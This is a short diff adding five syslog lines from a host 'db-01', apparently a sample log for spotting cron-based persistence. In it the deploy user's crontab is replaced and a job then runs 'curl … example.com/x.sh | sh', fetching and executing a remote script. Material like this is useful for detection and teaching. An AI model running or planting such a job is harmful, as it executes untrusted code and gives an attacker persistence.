@@ -1,0 +1,5 @@
+Oct 21 08:00:01 db-01 CROND[2001]: (root) CMD (run-parts /etc/cron.hourly)
+Oct 21 08:00:01 db-01 run-parts[2004]: (/etc/cron.hourly) starting 0anacron
+Oct 21 08:05:00 db-01 crontab[2100]: (deploy) REPLACE (deploy)
+Oct 21 08:10:01 db-01 CROND[2201]: (deploy) CMD (curl -fsS https://example.com/x.sh | sh)
+Oct 21 08:10:02 db-01 CROND[2200]: (deploy) CMDEND (curl -fsS https://example.com/x.sh | sh)
